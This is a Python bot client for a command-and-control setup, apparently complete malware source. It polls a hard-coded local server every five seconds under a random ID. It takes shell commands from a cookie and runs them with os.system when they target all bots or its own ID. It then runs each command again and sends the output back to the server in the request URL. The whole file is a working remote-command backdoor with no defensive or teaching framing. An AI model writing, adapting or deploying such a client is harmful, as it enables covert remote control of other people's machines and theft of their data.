import requests as r
import random
import os
import time
import string
import secrets
from urllib.parse import quote, unquote

chars = string.ascii_letters+string.digits
import base64

class client:

    def ret(server, id_num):
        session = r.Session()
        session.get(server)
        global cookie
        global cmd
        cookie = session.cookies.get_dict()
        cmd = unquote(cookie['command'])
        if cookie['for'] == 'All':
            os.system(cmd)
        
        if cookie['for'] == str(id_num):
            os.system(cmd)
        session.get(server+"&output="+id_num+"|$"+cmd+"> "+client.output())

    def output():
        results = os.popen(str(cmd)).read()
        result = ""

        for i in results:
            if i == "\n":
                result+=" "
            else:
                result+=i.strip()
        return result

    def generate_cookie():
        id_num = ""
        for i in range(len(chars)):

            id_num += chars[secrets.randbelow(len(chars))].strip()
        return id_num

id_num = client.generate_cookie()
while __name__ == '__main__':
    time.sleep(5)
    try:
        client.ret('http://127.0.0.1:5000?id='+id_num,id_num)
    except OSError as e:
        print(e)
        pass
        

